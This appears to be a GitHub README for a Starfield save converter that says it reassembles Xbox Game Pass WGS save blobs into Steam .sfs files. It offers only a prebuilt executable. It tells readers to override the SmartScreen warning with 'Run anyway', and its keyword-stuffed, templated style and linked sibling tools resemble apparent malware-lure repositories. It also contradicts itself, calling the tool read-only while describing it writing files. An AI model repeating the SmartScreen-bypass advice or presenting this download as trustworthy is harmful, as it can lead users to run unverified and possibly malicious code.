<p align="center">
  <img src="https://i.postimg.cc/gjW4GVfR/banner.png" alt="Starfield Game Pass to Steam Save Converter — Convert Xbox App WGS Saves to .sfs" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-GamePass%20%E2%86%94%20Steam-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-starfield--wgs--bridge--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Starfield Game Pass to Steam Save Converter — Convert Xbox App WGS Saves to .sfs

**Played Starfield on PC Game Pass and bought the Steam edition for SFSE and script mods? Xbox App splits each .sfs save across multiple hashed WGS blobs inside BethesdaSoftworks.ProjectGold. Reassemble your .sfs saves for Steam cleanly.**

Starfield Game Pass to Steam Save Converter focuses on Bethesda's multi-part Creation Engine 2 save containers: **reading `container.index` inside `%LOCALAPPDATA%\Packages\BethesdaSoftworks.ProjectGold_*\SystemAppData\wgs\`, concatenating split save chunks back into valid `.sfs` files, and placing them into `Documents\My Games\Starfield\Saves`**.

This project is aimed at **Starfield on Windows 10/11 PC** for migrating `.sfs` character saves between PC Game Pass and Steam—not editing player stats or bypassing achievement flags.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Steam Starfield Load menu shows no saves | Xbox App stores saves in `BethesdaSoftworks.ProjectGold_*\SystemAppData\wgs` | Reassemble `.sfs` save files from `wgs` into `My Games\Starfield\Saves` |
| Single `.sfs` save split into multiple 16 MB `wgs` blobs | Xbox WGS splits large Creation Engine saves across sequential container blobs | Concatenate container blobs in exact `container.index` order |
| OneDrive splits `Documents\My Games\Starfield\Saves` | Windows OneDrive redirects `Documents` away from `%USERPROFILE%\Documents` | Detect the active `My Games\Starfield\Saves` path automatically |
| Modded `.esm` saves warning on Steam load | Creation Club / Creations `.esm` plugins active on Game Pass save | Ensure matching `.esm` plugins are enabled in Steam `Plugins.txt` |

## Download for Windows

[**Download StarfieldWGSBridge.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/StarfieldWGSBridge.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `StarfieldWGSBridge.exe`? (Automatic checks in ~2 seconds)

- Locates `%LOCALAPPDATA%\Packages\BethesdaSoftworks.ProjectGold_*\SystemAppData\wgs` automatically.
- Reads `container.index` and reassembles split multi-blob containers into valid `.sfs` save files.
- Detects active `Documents\My Games\Starfield\Saves` (accounting for OneDrive redirection).
- Creates a dated backup of both Game Pass and Steam save folders before writing files.

### Sample Diagnostic Output

```text
[StarfieldWGSBridge] Scanning BethesdaSoftworks.ProjectGold WGS & Steam Saves...
[OK]   Game Pass Package: C:\Users\Player\AppData\Local\Packages\BethesdaSoftworks.ProjectGold_3275kfvn8vcwc
[OK]   Decoded Saves    : 6 .sfs saves reassembled from multi-blob WGS containers
[OK]   Backup Created   : Documents\Starfield-WGS-Backup\2026-11-20\
[OK]   Steam Target     : C:\Users\Player\Documents\My Games\Starfield\Saves (6 .sfs written)
```

The release ZIP is named `StarfieldWGSBridge.zip`; the Windows executable inside is named `StarfieldWGSBridge.exe`.

1. Close Starfield before moving or checking files.
2. Click **Download StarfieldWGSBridge.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `StarfieldWGSBridge.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Starfield and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit) with PC Game Pass and/or Steam versions of Starfield installed.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `StarfieldWGSBridge.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Multi-blob `.sfs` splitting inside `BethesdaSoftworks.ProjectGold`

Because Starfield `.sfs` files often exceed 20 MB–50 MB, Xbox WGS splits a single save across multiple hashed files that must be joined in exact sequence.

### Finding the `ProjectGold` package name

Starfield's Microsoft Store package uses its internal codename `BethesdaSoftworks.ProjectGold_*` rather than `Starfield`.

### OneDrive `Documents` redirection

Writing `.sfs` files to `%USERPROFILE%\Documents` when OneDrive owns `Documents` leaves them invisible to Steam Starfield.

### Keeping your Game Pass cloud save untouched

Reading `wgs` in read-only mode leaves your Xbox App save completely intact.

## Where Starfield files normally belong

Starfield separates PC Game Pass (`ProjectGold`) and Steam `.sfs` saves across `%LOCALAPPDATA%` and `Documents`:

```text
%LOCALAPPDATA%\Packages\BethesdaSoftworks.ProjectGold_3275kfvn8vcwc\SystemAppData\wgs\
```

Inside that structure, key files and subdirectories typically look like this:

```text
Xbox Game Pass (Source):
%LOCALAPPDATA%\Packages\BethesdaSoftworks.ProjectGold_*\SystemAppData\wgs\<XUID>\
├── container.index
└── <ContainerGUID>\<SplitHexBlobs>

Steam Edition (Target):
%USERPROFILE%\Documents\My Games\Starfield\Saves\
└── Autosave1_*.sfs / Save1_*.sfs
```

If you installed Creations or `.esm` mods on Game Pass, install the same mods on Steam before loading converted `.sfs` saves.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Close Starfield on both Xbox App and Steam.** Ensure cloud sync finishes before reading `wgs`.
2. **Launch Steam Starfield once to the main menu, then exit.** Initializes `Documents\My Games\Starfield\Saves`.
3. **Back up both `wgs` and `My Games\Starfield\Saves`.** Save dated copies in a separate folder.
4. **Reassemble `.sfs` files into active `My Games\Starfield\Saves`.** Verify `.sfs` file sizes match your Game Pass save containers.
5. **Launch Steam Starfield, load your save, and create a fresh manual save.** Syncs your character to Steam Cloud.

### Before moving any files

Never delete or rename files inside `SystemAppData\wgs\`; work strictly with reassembled `.sfs` copies.

## What an effective diagnostic report should tell you

A clear conversion report lists **source `BethesdaSoftworks.ProjectGold_*` path, reassembled `.sfs` filenames and sizes, backup location, and target `My Games\Starfield\Saves`**.

## FAQ

**Why is Starfield's Game Pass folder named `BethesdaSoftworks.ProjectGold`?**

`ProjectGold` is Bethesda's official Microsoft Store package identifier for Starfield on PC.

**Can I convert large 50+ MB Starfield saves from Game Pass to Steam?**

Yes—multi-blob WGS containers are concatenated in exact index order back into a single `.sfs` file.

**Does this delete my Xbox Game Pass save?**

No. Your Game Pass `wgs` folder is read-only and remains completely untouched.

## Useful reading

- [Starfield on Steam](https://store.steampowered.com/app/1716740/Starfield/)
- [Official Starfield Website (Bethesda)](https://bethesda.net/en/game/starfield)

## More Windows Game Diagnostic Tools

- [Starfield-PluginsOrderDoctor](../Starfield-PluginsOrderDoctor) — Starfield `Plugins.txt` & `StarfieldCustom.ini` load order check
- [Fable2026-GamePassSaveBridge](../Fable2026-GamePassSaveBridge) — Fable (2026) Game Pass ↔ Steam save converter
- [Palworld-GamePassSteamBridge](../Palworld-GamePassSteamBridge) — Palworld Xbox Game Pass ↔ Steam `Level.sav` converter
- [Stalker2-WGSSaveMigrator](../Stalker2-WGSSaveMigrator) — S.T.A.L.K.E.R. 2 Game Pass (`wgs`) ↔ Steam save migrator

*Independent community project. Not affiliated with Bethesda Softworks, ZeniMax Media, Microsoft, Valve, or Steam.*
 
 
 
 
 
 
 
 
 
